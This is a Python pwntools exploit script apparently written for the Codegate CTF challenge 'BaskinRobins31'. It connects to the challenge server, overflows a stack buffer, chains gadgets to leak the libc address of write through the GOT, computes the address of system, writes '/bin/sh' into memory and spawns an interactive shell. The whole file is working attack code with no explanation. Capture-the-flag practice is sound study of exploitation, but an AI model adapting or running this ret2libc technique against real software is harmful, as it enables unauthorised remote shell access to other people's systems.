#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

debug = 0
if debug == 0:
    host = "ch41l3ng3s.codegate.kr"
    port = 3131

    p = remote(host,port)
else:
    program=["./BaskinRobins31"]

    p = process(program,env={'LD_PRELOAD':"./libc.so.6"})
    # gdb.attach(p,"c")



helper_addr=0x400876
write_got=0x602028
write_plt=0x4006d0
write_offset=0xf72b0
system_offset=0x45390
read_plt=0x400700
buff=0x603000-0x10

p.recvuntil("(1-3)\n")
payload="a"*176+p64(0x1)+p64(helper_addr)+p64(write_got)+p64(0x8)+p64(write_plt)
p.sendline(payload)
p.recvuntil("Don't break the rules...:( \n")
data=p.recvline()[:8][::-1]
write_addr=int(enhex(data),16)
system_addr=write_addr - write_offset + system_offset
print "system: "+hex(system_addr)

p.recvuntil("(1-3)\n")
payload="a"*176+p64(0x0)+p64(helper_addr)+p64(buff)+p64(0x8)+p64(read_plt)
p.sendline(payload)
p.recvuntil("Don't break the rules...:( \n")
p.send("/bin/sh")

p.recvuntil("(1-3)\n")
payload="a"*176+p64(buff)+p64(helper_addr)+p64(buff)+p64(buff)+p64(system_addr)
p.sendline(payload)
p.recvuntil("Don't break the rules...:( \n")

p.interactive()
